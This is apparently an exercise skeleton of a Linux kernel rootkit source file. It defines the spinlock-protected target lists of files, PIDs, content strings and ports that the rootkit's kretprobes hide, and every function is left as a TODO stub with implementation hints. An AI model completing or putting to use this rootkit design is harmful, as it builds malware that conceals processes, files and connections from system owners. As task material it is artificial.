// SPDX-License-Identifier: GPL-2.0
//
// Target list management with spinlock protection.
//
// Four target categories: files, PIDs, content strings, and ports.
// The hiding kretprobes in filter.c query these lists under lock.
//
#include <linux/errno.h>
#include <linux/string.h>

#include "rootkit.h"

// Global target list instances
struct rk_target_list rk_file_targets;
struct rk_target_list rk_pid_targets;
struct rk_target_list rk_content_targets;
struct rk_port_list rk_port_targets;

// ---- string target operations ----

void rk_target_init(struct rk_target_list *list)
{
	// TODO: Initialize spinlock and zero count
}

int rk_target_add(struct rk_target_list *list, const char *value)
{
	// TODO: Under spin_lock_irqsave:
	// - Check count < RK_MAX_TARGETS (return -ENOSPC)
	// - Check strlen(value) < RK_TARGET_LEN (return -ENAMETOOLONG)
	// - strscpy into list->targets[count], increment count
	return -ENOSYS;
}

int rk_target_remove(struct rk_target_list *list, const char *value)
{
	// TODO: Under lock, find by strcmp, shift remaining, decrement count
	// Return -ENOENT if not found
	return -ENOENT;
}

bool rk_target_match(struct rk_target_list *list, const char *name)
{
	// TODO: Under lock, exact strcmp match against all entries
	return false;
}

bool rk_line_matches(struct rk_target_list *list,
		     const char *line, size_t len)
{
	// TODO: Under lock, check if any target is a substring of line
	// using strnstr(line, target, len)
	return false;
}

// ---- port target operations ----

void rk_port_init(struct rk_port_list *list)
{
	// TODO: Initialize spinlock and zero count
}

int rk_port_add(struct rk_port_list *list, unsigned short port)
{
	// TODO: Under lock, check bounds, append port, increment count
	return -ENOSYS;
}

int rk_port_remove(struct rk_port_list *list, unsigned short port)
{
	// TODO: Under lock, find port, shift remaining, decrement count
	return -ENOENT;
}

bool rk_port_match(struct rk_port_list *list, unsigned short port)
{
	// TODO: Under lock, linear scan for matching port
	return false;
}
